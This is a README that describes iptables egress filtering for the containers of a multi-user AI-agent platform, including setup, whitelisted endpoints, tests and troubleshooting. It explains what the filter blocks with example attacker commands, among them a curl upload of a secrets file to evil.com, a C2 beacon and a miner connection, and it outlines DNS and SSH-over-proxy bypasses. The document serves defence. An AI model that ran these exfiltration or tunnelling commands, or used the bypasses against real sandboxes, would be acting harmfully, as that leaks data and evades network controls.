## Egress Network Filtering

## Overview

Egress filtering restricts **outbound connections** from user containers to prevent:
- Data exfiltration to attacker-controlled servers
- Command & control (C2) communication from malware
- Cryptocurrency mining pool connections
- SSH/database scanning of internal networks
- Unauthorized external service access

## How It Works

The filtering uses **host-level iptables rules** that:
1. Block dangerous outbound ports (SSH, databases, RDP, VNC)
2. Whitelist only necessary AI API endpoints
3. Allow DNS for name resolution
4. Allow package repositories (pip, npm)
5. **Drop all other outbound traffic**

## Installation

### Prerequisites

```bash
# Debian/Ubuntu
sudo apt-get update
sudo apt-get install iptables iptables-persistent

# RHEL/CentOS/Fedora
sudo yum install iptables iptables-services
```

### Setup

**Run on the HOST machine** (not in containers):

```bash
sudo bash docker_files/setup-egress-filtering.sh
```

The script will:
- ✅ Backup current iptables rules
- ✅ Create CLI-AGENT-EGRESS chain
- ✅ Configure filtering rules
- ✅ Make rules persistent across reboots
- ✅ Display current configuration

### Removal

To disable egress filtering:

```bash
sudo bash docker_files/remove-egress-filtering.sh
```

## What's Allowed

### AI API Endpoints (HTTPS only)

- ✅ **Anthropic:** api.anthropic.com (Claude)
- ✅ **OpenAI:** api.openai.com (GPT)
- ✅ **Google:** generativelanguage.googleapis.com, ai.google.dev (Gemini)
- ✅ **Groq:** api.groq.com
- ✅ **NVIDIA:** integrate.api.nvidia.com
- ✅ **Brave Search:** api.search.brave.com
- ✅ **HuggingFace:** huggingface.co, api-inference.huggingface.co

### Infrastructure

- ✅ **DNS:** UDP/TCP port 53 (all destinations)
- ✅ **Python packages:** pypi.org, files.pythonhosted.org
- ✅ **NPM packages:** registry.npmjs.org

## What's Blocked

### Dangerous Ports

- ❌ **SSH:** Port 22
- ❌ **FTP:** Port 21
- ❌ **MySQL:** Port 3306
- ❌ **PostgreSQL:** Port 5432
- ❌ **Redis:** Port 6379
- ❌ **MongoDB:** Port 27017
- ❌ **RDP:** Port 3389
- ❌ **VNC:** Port 5900

### Everything Else

- ❌ **All other outbound connections** (default DROP policy)

## Testing

### Test Allowed Connections

```bash
# Should work: AI API
docker exec <container-id> curl -I https://api.anthropic.com
# Response: HTTP/2 200 or 401 (reachable)

# Should work: DNS
docker exec <container-id> nslookup google.com
# Response: Server address and IP

# Should work: Package install
docker exec <container-id> pip install requests
# Response: Successfully installed
```

### Test Blocked Connections

```bash
# Should fail: SSH
docker exec <container-id> curl -I http://example.com:22
# Response: Connection timeout or refused

# Should fail: MySQL
docker exec <container-id> curl -I http://example.com:3306
# Response: Connection timeout or refused

# Should fail: Random website
docker exec <container-id> curl -I https://random-site.com
# Response: Connection timeout (not whitelisted)
```

## Monitoring Blocked Connections

### Enable Logging (Optional)

Edit `setup-egress-filtering.sh` and uncomment:

```bash
iptables -A CLI-AGENT-EGRESS -j LOG --log-prefix "CLI-AGENT-BLOCKED: " --log-level 4
```

Then view blocked connections:

```bash
# View recent blocks
sudo tail -f /var/log/kern.log | grep "CLI-AGENT-BLOCKED"

# Count blocks by destination
sudo grep "CLI-AGENT-BLOCKED" /var/log/kern.log | awk '{print $13}' | sort | uniq -c | sort -rn
```

**Warning:** Logging can generate significant log volume. Only enable for debugging.

## Adding Custom Endpoints

To whitelist additional endpoints, edit `setup-egress-filtering.sh`:

```bash
# Add before the default DROP rule:
iptables -A CLI-AGENT-EGRESS -p tcp --dport 443 -d your-api.example.com -j ACCEPT
```

Then re-run the script:

```bash
sudo bash docker_files/setup-egress-filtering.sh
```

## Troubleshooting

### Container can't reach AI APIs

**Check DNS resolution:**
```bash
docker exec <container-id> nslookup api.anthropic.com
```

If DNS fails, the issue is DNS configuration, not egress filtering.

**Check iptables rules:**
```bash
sudo iptables -L CLI-AGENT-EGRESS -n --line-numbers
```

Verify whitelist rules exist for your AI provider.

### Container needs access to new endpoint

**Add to whitelist:**

1. Edit `docker_files/setup-egress-filtering.sh`
2. Add new `iptables -A CLI-AGENT-EGRESS ... -j ACCEPT` rule
3. Re-run setup script

### Rules don't persist after reboot

**Install persistence package:**

```bash
# Debian/Ubuntu
sudo apt-get install iptables-persistent
sudo netfilter-persistent save

# RHEL/CentOS
sudo yum install iptables-services
sudo service iptables save
```

### How to temporarily disable filtering

**Option 1: Remove all rules (cleanest):**
```bash
sudo bash docker_files/remove-egress-filtering.sh
```

**Option 2: Flush chain (quick test):**
```bash
sudo iptables -F CLI-AGENT-EGRESS
```

**Note:** Option 2 changes are NOT persistent across reboots.

## Architecture

### iptables Chain Structure

```
FORWARD chain (Docker traffic)
    ↓
    ├─→ CLI-AGENT-EGRESS chain
    │     ├─→ DROP: Port 22, 21, 3306, 5432, etc. (dangerous ports)
    │     ├─→ ACCEPT: UDP/TCP 53 (DNS)
    │     ├─→ ACCEPT: HTTPS to api.anthropic.com
    │     ├─→ ACCEPT: HTTPS to api.openai.com
    │     ├─→ ACCEPT: HTTPS to other whitelisted APIs
    │     └─→ DROP: Everything else (default)
    └─→ ACCEPT (if no match, proceed normally)
```

### Network Flow

```
Container
    ↓ Outbound connection attempt
Docker Bridge (docker0)
    ↓
iptables FORWARD chain
    ↓
CLI-AGENT-EGRESS chain
    ↓
    ├─ Matches whitelist → ACCEPT → Internet
    ├─ Matches blocklist → DROP → Blocked
    └─ No match → DROP (default) → Blocked
```

## Security Benefits

### Prevents Data Exfiltration

Attacker compromises container and tries to send data out:

```bash
# Attacker command in container:
curl -X POST https://evil.com/exfil -d @/workspace/data/secrets.txt

# Result: Connection timeout (evil.com not whitelisted)
```

### Blocks C2 Communication

Malware tries to establish command & control:

```bash
# Malware beacon:
curl https://c2-server.com/beacon

# Result: Connection timeout
```

### Prevents Cryptocurrency Mining

Mining software tries to connect to pool:

```bash
# Mining software:
./miner --pool mining-pool.com:3333

# Result: Connection timeout (port 3333 not whitelisted)
```

### Blocks Internal Network Scanning

Attacker tries to scan internal network:

```bash
# SSH scan:
nmap -p 22 192.168.1.0/24

# Result: All SSH connections blocked at firewall
```

## Performance Impact

**Minimal:** iptables filtering adds ~microseconds of latency per packet

- ✅ No noticeable impact on API response times
- ✅ No impact on throughput (within limits)
- ✅ Rules evaluated in kernel space (very fast)

## Limitations

### DNS-based Bypasses

If an attacker controls DNS, they might resolve a malicious domain to an AI API IP:

```bash
# Attacker sets evil.com to resolve to api.anthropic.com IP
# Then: curl https://evil.com  # Might bypass filtering
```

**Mitigation:** Use domain-based filtering (requires DNS inspection)

### Encrypted Tunnels

Attacker could tunnel traffic through whitelisted endpoint:

```bash
# SSH over HTTPS to whitelisted domain
ssh -o "ProxyCommand=nc -X connect -x api.anthropic.com:443 %h %p" target

# This is theoretically possible but very complex
```

**Mitigation:** Deep packet inspection (DPI) - out of scope for iptables

### IPv6

Current rules only filter IPv4. If IPv6 is enabled:

```bash
# Add IPv6 rules:
sudo ip6tables -N CLI-AGENT-EGRESS
sudo ip6tables -A CLI-AGENT-EGRESS -j DROP  # Block all IPv6 egress
```

Or disable IPv6 on Docker networks.

## Best Practices

1. **Start with default rules** - Test before customizing
2. **Log blocked traffic** initially - Identify false positives
3. **Review logs regularly** - Look for suspicious patterns
4. **Update whitelist** as needed - Add new AI APIs
5. **Test after changes** - Verify containers still function
6. **Monitor performance** - Ensure no degradation
7. **Document custom rules** - Why each endpoint is whitelisted

## Alternative Approaches

### Docker Network Plugins

More sophisticated network control:
- **Calico:** Full network policies with domain filtering
- **Weave:** Built-in network policies
- **Cilium:** eBPF-based filtering with DNS awareness

### Cloud Provider Firewalls

If running in cloud:
- **AWS Security Groups:** Outbound rules at instance level
- **GCP Firewall Rules:** VPC-level egress filtering
- **Azure NSG:** Network security groups

### Application-Level Proxies

Force all traffic through proxy:
- **Squid:** HTTP/HTTPS proxy with whitelist
- **Privoxy:** Privacy-focused proxy
- **CONNECT method proxy:** For HTTPS tunneling

## Compliance

Egress filtering helps meet security compliance requirements:

- ✅ **PCI-DSS 1.2.1:** Restrict inbound and outbound traffic
- ✅ **HIPAA § 164.312(e)(1):** Access controls for ePHI
- ✅ **SOC 2:** Network security controls
- ✅ **ISO 27001 A.13.1.3:** Segregation in networks

## Conclusion

Egress filtering is a critical **defense-in-depth** layer that:
- Prevents data exfiltration
- Blocks C2 communication
- Restricts cryptocurrency mining
- Limits attack surface

Combined with other security measures (seccomp, AppArmor, capabilities, network isolation), it significantly improves the security posture of CLI-Agent's multi-user infrastructure.

---

**Related Documentation:**
- `README_SECCOMP.md` - Syscall filtering
- `README_CONTAINER_MANAGER_SECURITY.md` - Non-root execution
- `SECURITY_WARNING.md` - Full security analysis
